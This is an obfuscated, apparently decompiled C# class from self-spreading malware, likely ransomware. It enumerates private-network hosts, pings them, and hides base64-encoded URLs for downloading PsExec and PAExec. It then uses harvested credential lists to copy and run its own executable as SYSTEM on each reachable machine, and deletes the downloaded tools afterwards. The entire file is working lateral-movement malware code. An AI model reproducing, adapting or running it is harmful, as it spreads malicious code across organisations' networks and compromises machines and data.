using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Net;
using System.Net.NetworkInformation;
using System.Reflection;
using System.Threading.Tasks;

namespace WvdSzXINIqX;

internal sealed class IvbJmHRnKzXS
{
	private sealed class yOHZCzKDceklvQpP
	{
		public string nGgyLCmDsP;

		public string qGkAdUwBSa;

		public void _003CRun_003Eb__d(string string_0)
		{
			if ((!string_0.StartsWith("10.") && !string_0.StartsWith("172.") && !string_0.StartsWith("192.168.") && !string_0.Contains("")) || !zKGiVDaeLxwG(string_0))
			{
				return;
			}
			if (JenwHsdeeXa.QDYzmvMZSfji == "YES")
			{
				for (int i = 0; i < qDjVNZvgQpxqcs.Count; i++)
				{
					if (JenwHsdeeXa.rpMaqoBgWkMBW)
					{
						if (File.Exists(nGgyLCmDsP))
						{
							JenwHsdeeXa.kpitRsUfUPt(nGgyLCmDsP, "\\\\" + string_0 + " -u \"" + qDjVNZvgQpxqcs[i] + "\" -p \"" + nfBrfBaqRagvbAKC[i] + "\" -d -f -h -s -n 5 -c \"" + Assembly.GetEntryAssembly()!.Location + "\"");
						}
					}
					else if (File.Exists(qGkAdUwBSa))
					{
						JenwHsdeeXa.kpitRsUfUPt(qGkAdUwBSa, "\\\\" + string_0 + " -u \"" + qDjVNZvgQpxqcs[i] + "\" -p \"" + nfBrfBaqRagvbAKC[i] + "\" -d -h -s -f -accepteula -nobanner -c \"" + Assembly.GetEntryAssembly()!.Location + "\"");
					}
				}
			}
			else if (JenwHsdeeXa.rpMaqoBgWkMBW)
			{
				if (File.Exists(nGgyLCmDsP))
				{
					JenwHsdeeXa.kpitRsUfUPt(nGgyLCmDsP, "\\\\" + string_0 + " -d -f -h -s -n 5 -c \"" + Assembly.GetEntryAssembly()!.Location + "\"");
				}
			}
			else if (File.Exists(qGkAdUwBSa))
			{
				JenwHsdeeXa.kpitRsUfUPt(qGkAdUwBSa, "\\\\" + string_0 + " -d -h -s -f -accepteula -nobanner -c \"" + Assembly.GetEntryAssembly()!.Location + "\"");
			}
		}
	}

	public static List<string> KCbcybirTRfG = new List<string>();

	public static string SyQPwpIfkzWxE = "";

	public static List<string> qDjVNZvgQpxqcs = new List<string>();

	public static List<string> nfBrfBaqRagvbAKC = new List<string>();

	public static List<string> zQbuJqaqbn = new List<string>();

	public List<string> tkONbNZJKv = new List<string>();

	public List<string> nvdAzvqCFWNZ = new List<string>();

	public List<string> kaUwHNDivlBEj = new List<string>();

	public static void vLqzXpzDKrI()
	{
		yOHZCzKDceklvQpP CS_0024_003C_003E8__locals0 = new yOHZCzKDceklvQpP();
		JenwHsdeeXa.ueqGtQtumYE();
		List<bZZGaZmrvLrM> list = bZZGaZmrvLrM.lYafdGzADRKW();
		foreach (bZZGaZmrvLrM item in list)
		{
			KCbcybirTRfG.Add(item.IPAddress);
		}
		if (JenwHsdeeXa.kpbBxwbeqJxuMM.Count > 0)
		{
			KCbcybirTRfG = KCbcybirTRfG.Union(JenwHsdeeXa.kpbBxwbeqJxuMM).ToList();
		}
		CS_0024_003C_003E8__locals0.nGgyLCmDsP = "";
		CS_0024_003C_003E8__locals0.qGkAdUwBSa = "";
		try
		{
			CS_0024_003C_003E8__locals0.nGgyLCmDsP = ZMmuArgRdsfuu();
		}
		catch
		{
		}
		try
		{
			CS_0024_003C_003E8__locals0.qGkAdUwBSa = xFMcYZDexEAS();
		}
		catch
		{
		}
		foreach (bZZGaZmrvLrM item2 in list)
		{
			try
			{
				if (item2.IPAddress.StartsWith("10.") || item2.IPAddress.StartsWith("172.") || item2.IPAddress.StartsWith("192.168.") || item2.IPAddress.Contains(""))
				{
					MLcSojqPJYLX.AJoklNFtYfGs(item2.MacAddress, item2.IPAddress, "255.255.255.0");
				}
			}
			catch
			{
			}
		}
		try
		{
			Parallel.ForEach(KCbcybirTRfG, delegate(string string_0)
			{
				if ((string_0.StartsWith("10.") || string_0.StartsWith("172.") || string_0.StartsWith("192.168.") || string_0.Contains("")) && zKGiVDaeLxwG(string_0))
				{
					if (JenwHsdeeXa.QDYzmvMZSfji == "YES")
					{
						for (int i = 0; i < qDjVNZvgQpxqcs.Count; i++)
						{
							if (JenwHsdeeXa.rpMaqoBgWkMBW)
							{
								if (File.Exists(CS_0024_003C_003E8__locals0.nGgyLCmDsP))
								{
									JenwHsdeeXa.kpitRsUfUPt(CS_0024_003C_003E8__locals0.nGgyLCmDsP, "\\\\" + string_0 + " -u \"" + qDjVNZvgQpxqcs[i] + "\" -p \"" + nfBrfBaqRagvbAKC[i] + "\" -d -f -h -s -n 5 -c \"" + Assembly.GetEntryAssembly()!.Location + "\"");
								}
							}
							else if (File.Exists(CS_0024_003C_003E8__locals0.qGkAdUwBSa))
							{
								JenwHsdeeXa.kpitRsUfUPt(CS_0024_003C_003E8__locals0.qGkAdUwBSa, "\\\\" + string_0 + " -u \"" + qDjVNZvgQpxqcs[i] + "\" -p \"" + nfBrfBaqRagvbAKC[i] + "\" -d -h -s -f -accepteula -nobanner -c \"" + Assembly.GetEntryAssembly()!.Location + "\"");
							}
						}
					}
					else if (JenwHsdeeXa.rpMaqoBgWkMBW)
					{
						if (File.Exists(CS_0024_003C_003E8__locals0.nGgyLCmDsP))
						{
							JenwHsdeeXa.kpitRsUfUPt(CS_0024_003C_003E8__locals0.nGgyLCmDsP, "\\\\" + string_0 + " -d -f -h -s -n 5 -c \"" + Assembly.GetEntryAssembly()!.Location + "\"");
						}
					}
					else if (File.Exists(CS_0024_003C_003E8__locals0.qGkAdUwBSa))
					{
						JenwHsdeeXa.kpitRsUfUPt(CS_0024_003C_003E8__locals0.qGkAdUwBSa, "\\\\" + string_0 + " -d -h -s -f -accepteula -nobanner -c \"" + Assembly.GetEntryAssembly()!.Location + "\"");
					}
				}
			});
		}
		catch
		{
			return;
		}
		try
		{
			if (File.Exists(CS_0024_003C_003E8__locals0.nGgyLCmDsP))
			{
				File.Delete(CS_0024_003C_003E8__locals0.nGgyLCmDsP);
			}
		}
		catch (Exception)
		{
		}
		try
		{
			if (File.Exists(CS_0024_003C_003E8__locals0.qGkAdUwBSa))
			{
				File.Delete(CS_0024_003C_003E8__locals0.qGkAdUwBSa);
			}
		}
		catch (Exception)
		{
		}
	}

	public static string ZMmuArgRdsfuu()
	{
		if (IntPtr.Size == 8)
		{
			return tAdysqnnfiUOCW(new Uri(JenwHsdeeXa.XKJIixIieoUFn("aHR0cHM6Ly93d3cucG93ZXJhZG1pbi5jb20vcGFleGVjL3BhZXhlYy5leGU=")));
		}
		return tAdysqnnfiUOCW(new Uri(JenwHsdeeXa.XKJIixIieoUFn("aHR0cHM6Ly93d3cucG93ZXJhZG1pbi5jb20vcGFleGVjL3BhZXhlYy5leGU=")));
	}

	public static string xFMcYZDexEAS()
	{
		if (IntPtr.Size == 8)
		{
			return tAdysqnnfiUOCW(new Uri(JenwHsdeeXa.XKJIixIieoUFn("aHR0cDovL2xpdmUuc3lzaW50ZXJuYWxzLmNvbS9Qc0V4ZWM2NC5leGU=")));
		}
		return tAdysqnnfiUOCW(new Uri(JenwHsdeeXa.XKJIixIieoUFn("aHR0cDovL2xpdmUuc3lzaW50ZXJuYWxzLmNvbS9Qc0V4ZWMuZXhl")));
	}

	public static bool zKGiVDaeLxwG(string string_0)
	{
		bool result = false;
		Ping ping = null;
		try
		{
			using (ping = new Ping())
			{
				PingReply pingReply = ping.Send(string_0);
				result = pingReply.Status == IPStatus.Success;
				return result;
			}
		}
		catch (PingException)
		{
			return result;
		}
		finally
		{
			ping?.Dispose();
		}
	}

	public static string tAdysqnnfiUOCW(Uri uri_0)
	{
		string path = Path.GetRandomFileName().Replace(".", "").Remove(0, 3) + ".exe";
		WebClient webClient = new WebClient();
		webClient.DownloadFile(uri_0, Path.Combine(Path.GetTempPath(), path));
		return Path.Combine(Path.GetTempPath(), path);
	}
}
